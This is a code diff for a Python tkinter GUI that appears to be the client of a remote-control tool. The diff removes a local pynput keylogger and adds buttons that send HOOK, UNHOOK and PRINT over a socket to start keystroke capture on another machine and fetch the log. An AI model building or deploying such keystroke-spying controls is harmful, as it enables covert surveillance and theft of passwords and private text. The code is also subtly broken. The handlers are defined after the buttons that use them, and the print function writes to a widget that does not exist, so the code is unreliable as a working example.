@@ -113,31 +113,6 @@ class GUI:
                     columns = line.split("\t")
                     if len(columns) == 3:  # Expecting three columns: Image name, PID, Thread count
                         self.app_list.insert("", "end", values=columns)
-                # self.client.Cli_Sock.send("XEM".encode())
-                # response = self.client.Cli_Sock.recv(1024).decode()
-                # # Clear the app_list
-                # for item in self.app_list.get_children():
-                #     self.app_list.delete(item)
-                # # Update the app_list with the received data
-                # for line in response.split("\n"):
-                #     if line.startswith("Name App"):
-                #         continue
-                #     columns = line.split()
-                #     if len(columns) == 3:
-                #         self.app_list.insert("", "end", values=columns)
-                # self.client.send_data("XEM")
-                # soprocess = int(self.client.receive_data().strip())
-                # for _ in range(soprocess):
-                #     s1 = self.client.receive_data()
-                #     if s1 == "ok":
-                #         s1 = self.client.receive_data()
-                #         s2 = self.client.receive_data()
-                #         s3 = self.client.receive_data()
-                #         one = (s1, s2, s3)
-                #         self.app_list.insert("", "end", values=one)
-                
-                # self.client.send("view".encode())
-                # response = self.client.recv(1024).decode()
                 messagebox.showinfo("Response", response)
             except Exception as ex:
                 messagebox.showerror("Error", str(ex))
@@ -189,36 +164,6 @@ class GUI:
         key_window = tk.Tk()
         key_window.title("Keystroke Log")
 
-        def hook_click():
-            self.key_listener = pynput.keyboard.Listener(
-                on_press=self.on_key_press)
-            self.key_listener.start()
-            self.nw.write("HOOK")
-            self.nw.flush()
-
-        def unhook_click():
-            if hasattr(self, 'key_listener'):
-                self.key_listener.stop()
-                self.nw.write("UNHOOK")
-                self.nw.flush()
-
-        def print_click():
-            try:
-                with open("keylog.txt", "r") as f:
-                    keystrokes = f.read()
-                    self.txtKQ.delete(1.0, tk.END)  # Clear existing text
-                    self.txtKQ.insert(tk.END, keystrokes)
-            except Exception as e:
-                print(str(e))
-
-        def delete_click():
-            try:
-                with open("keylog.txt", "w") as f:
-                    f.truncate(0)  # Clear the file content
-                self.txtKQ.delete(1.0, tk.END)  # Clear the Text widget
-            except Exception as e:
-                print(str(e))
-
         # Buttons
         hook_button = tk.Button(
             key_window, text="Hook", width=10, command=hook_click)
@@ -229,16 +174,30 @@ class GUI:
         view_button.grid(row=0, column=1, padx=10, pady=10)
 
         delete_button = tk.Button(
-            key_window, text="Xóa", width=10, command=delete_click)
+            key_window, text="Clear", width=10, command=delete_click)
         delete_button.grid(row=0, column=2, padx=10, pady=10)
 
         start_button = tk.Button(
-            key_window, text="In", width=10, command=print_click)
+            key_window, text="Print", width=10, command=print_click)
         start_button.grid(row=0, column=3, padx=10, pady=10)
 
         # KeyLog text box
         self.txtKQ = tk.Text(key_window, width=50, height=20)
         self.txtKQ.grid(row=1, column=0, columnspan=4, padx=20, pady=20)
+
+        def hook_click():
+            self.client.Cli_Sock.send("HOOK".encode()) # Send the command to the server
+
+        def unhook_click():
+            self.client.Cli_Sock.send("UNHOOK".encode())
+
+        def print_click():
+            self.client.Cli_Sock.send("PRINT".encode())
+            data = self.client.Cli_Sock.recv(5000).decode()
+            self.textbox.insert(tk.END, data)
+
+        def delete_click():
+            self.textbox.delete("1.0", tk.END)
 
         key_window.mainloop()
 
